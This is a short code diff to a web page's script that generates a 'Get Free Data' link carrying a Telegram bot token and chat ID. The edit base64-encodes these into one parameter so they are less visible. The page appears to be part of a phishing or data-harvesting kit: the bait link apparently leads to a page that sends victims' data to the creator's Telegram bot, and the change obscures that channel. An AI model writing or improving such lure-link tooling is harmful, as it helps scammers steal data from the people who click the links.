@@ -118,10 +118,11 @@
                 return;
             }
 
-            const link = `get-free-data.html?token=${telegramToken}&chatId=${chatId}`;
+            const encodedParams = btoa(`token=${telegramToken}&chatId=${chatId}`);
+            const link = `get-free-data.html?data=${encodedParams}`;
 
             const generatedLinkElement = document.getElementById('generatedLink');
-            generatedLinkElement.innerHTML = `<a href="${link}" target="_blank">Get Free data</a>`;
+            generatedLinkElement.innerHTML = `<a href="${link}" target="_blank">Get Free Data</a>`;
         }
     </script>
 </body>
